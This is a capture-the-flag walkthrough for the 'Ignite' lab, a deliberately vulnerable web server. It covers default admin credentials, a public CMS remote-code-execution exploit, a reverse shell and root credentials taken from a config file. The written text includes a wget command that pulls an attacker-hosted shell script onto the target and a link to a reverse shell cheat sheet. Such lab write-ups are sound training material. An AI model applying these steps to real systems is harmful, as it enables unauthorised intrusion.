## Ignite
<img width="122" height="101" alt="image" src="https://github.com/user-attachments/assets/3d90b0cb-86bd-426b-b8e3-9f7244ea1b3f" />

- Easy room it say with details as follows: A new start-up has a few issues with their web server.

- So first thing I do is examine the website, and look for fields or details I can use.

  <img width="810" height="148" alt="image" src="https://github.com/user-attachments/assets/8107f8ff-00a9-4660-8c63-0193e7e5ddec" />
  - This seems important. So lets try to use this information to login at the admin screen.
<img width="1042" height="245" alt="image" src="https://github.com/user-attachments/assets/80161d09-179b-4ba1-a129-9e7b12f56caa" />

- It worked, we are in as admin, someone did not change default credentials. And we now have access to upload files it looks like.

- A quick search using searchsploit gives us insight into what we can do next, with RCE 1.

<img width="1367" height="314" alt="image" src="https://github.com/user-attachments/assets/09f73a92-77ba-4a8a-ad3a-f8cc56ac3c5d" />
<img width="529" height="158" alt="image" src="https://github.com/user-attachments/assets/313c0269-d86f-40cd-8909-03538fd1f3b7" />
- We go ahead and get the exploit from the path, and go into nano to edit.
- We change the url to the target, and also comment out the proxy part because we will not need it most likely.


<img width="1342" height="374" alt="image" src="https://github.com/user-attachments/assets/65cb576f-37bb-4d0a-a565-132f6166264b" />

- After some trial and error got it to work, ended up commenting out too much..
<img width="788" height="260" alt="image" src="https://github.com/user-attachments/assets/57c56a4d-6492-4b3d-9ab7-d0f5da184573" />


- Looked for bash, and found.
  <img width="192" height="60" alt="image" src="https://github.com/user-attachments/assets/d9df8413-8ee1-42ba-97d2-3c0bff18b039" />

 - Let's try to find a reverse shell to use to get access.
 - Setup a listener on my machine first.
  <img width="290" height="102" alt="image" src="https://github.com/user-attachments/assets/eb98ec6f-c2aa-43ed-a438-4f3108c35367" />

  - Used a reverse shell cheat sheet I found with bash. https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet

<img width="386" height="106" alt="image" src="https://github.com/user-attachments/assets/cd9bd5dd-a814-4738-bcf0-b2096e58e7eb" />

- Changing all the information to your machine.
- Hosted a web server on my machine to send to our target now.
  <img width="311" height="74" alt="image" src="https://github.com/user-attachments/assets/2ddb22e4-3af8-42db-9910-3bfd3be9a372" />

  - Executed a wget http://yourip/fuel.sh and gave it execute permissions.
    <img width="204" height="48" alt="image" src="https://github.com/user-attachments/assets/8637fc8d-85fa-4d39-84e9-795482227bb4" />

  - Executed bash with our file, and it worked.
    <img width="214" height="29" alt="image" src="https://github.com/user-attachments/assets/d3ae077f-1723-4fef-8717-9a692e401d50" />
    <img width="688" height="119" alt="image" src="https://github.com/user-attachments/assets/14cc4ee1-acf5-4304-aa2a-d2b0aa7b3c98" />

  - A quick look around we found our flag. 
<img width="636" height="318" alt="image" src="https://github.com/user-attachments/assets/f4b78574-f58b-4fe0-8891-87678fd95406" />

- During our first look at the site, we found admin, admin combo. Also there was some other information, and digging deeper might help us.
  <img width="856" height="173" alt="image" src="https://github.com/user-attachments/assets/6f207258-5f8f-49d1-848d-9fe17ac71fc3" />
- And now we know that the default root information is as follows, found in the database.php file on the system.
  <img width="577" height="376" alt="image" src="https://github.com/user-attachments/assets/0dadcb48-b17b-4160-839f-2116b5e2bcd5" />
  
- Before we could try to login we needed to get an actual terminal or we get this.
  <img width="342" height="75" alt="image" src="https://github.com/user-attachments/assets/9a5fcb3b-5cac-4eb6-b2fc-cfc61077918e" />

- Using these commands we get there and we can login to root with the password think might be it.
  <img width="682" height="206" alt="image" src="https://github.com/user-attachments/assets/9d180714-6654-455d-bebc-583d45052358" />

- We login and cd /root and find our final flag of this lab.
- Could be noted there was probably another way to access both flags, since we had access to the dashboard, we could of uploaded a file to recieve the reverse shell most likely also.
<img width="659" height="362" alt="image" src="https://github.com/user-attachments/assets/330501fd-c9ac-492b-91a1-db623b880dcd" />




  




